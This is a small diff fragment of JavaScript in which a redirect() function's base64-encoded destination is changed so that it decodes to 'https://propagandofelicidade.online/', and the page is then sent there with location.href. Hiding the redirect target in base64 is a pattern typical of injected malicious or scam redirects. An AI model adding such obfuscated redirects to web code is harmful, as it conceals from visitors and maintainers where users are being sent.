@@ -12,6 +12,6 @@ function step2() {
   }
 
   function redirect() {
-      site = "cHJvcGFnYW5kb2ZlbGljaWRhZGUub25saW5lLw=="
+      site = "aHR0cHM6Ly9wcm9wYWdhbmRvZmVsaWNpZGFkZS5vbmxpbmUv"
       location.href = atob(site);
   }
